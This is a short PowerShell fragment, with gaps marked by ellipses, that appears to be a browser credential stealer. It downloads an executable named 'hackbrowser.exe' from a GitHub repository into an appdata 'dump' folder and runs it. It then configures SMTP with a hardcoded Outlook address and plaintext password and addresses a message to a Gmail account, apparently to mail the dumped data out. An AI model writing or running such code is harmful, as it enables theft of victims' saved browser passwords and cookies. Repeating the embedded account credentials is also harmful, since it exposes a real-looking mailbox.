...
Invoke-WebRequest -Uri "https://github.com/karlosedson/BrowserMakerz/raw/main/hackbrowser.exe" -OutFile "$env:appdata\dump\hb.exe"
./hb.exe
...
$smtp.Credentials = New-Object System.Net.NetworkCredential("karlosedson2007@outlook.com", "Brayan0078");
$smtp.EnableSsl = $true
$Message.From = "karlosedson2007@outlook.com"
$Message.To.Add("lucascleber2007@gmail.com")
